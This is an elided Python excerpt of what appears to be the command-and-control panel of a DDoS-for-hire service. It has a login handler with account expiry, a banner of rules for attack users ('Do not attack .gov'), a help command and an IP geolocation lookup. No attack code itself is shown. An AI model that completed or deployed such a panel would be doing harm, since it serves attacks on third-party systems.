...
def text2Gen():
    word = """
                        ...
                        Type help to see C2 commands!
                        Do not attack .gov and another government sites
                        Dont spam attacks, everyone also want to attack, like u!
                        Follow these rules or your account will be deleted, HF!
    ...
    for x in credentials:
        ...
        if userC.username.lower() == username.lower() and userC.password == password:
            if userC.userC_expirada():
                ...
                send(client, f'{cyan} Your account has been expired!')
                time.sleep(3.5)
                client.close()
                return
            return True
...
def handle_client(client, address):
    ...
    while 1:
        send(client, ansi_clear, False)
        send(client, f'\x1b{cyan}Username :\x1b[0m ', False, False)
    ...
    password = ''
    while 1:
        send(client, f'\033{cyan}Password :\x1b[0;38;2;0;0;0m ', False, False)
    ...
    while 1:
        try:
            ...
            if command == 'HELP':
                ...
                ip_to_loc(args, send, client, cyan) # Gets location from IP
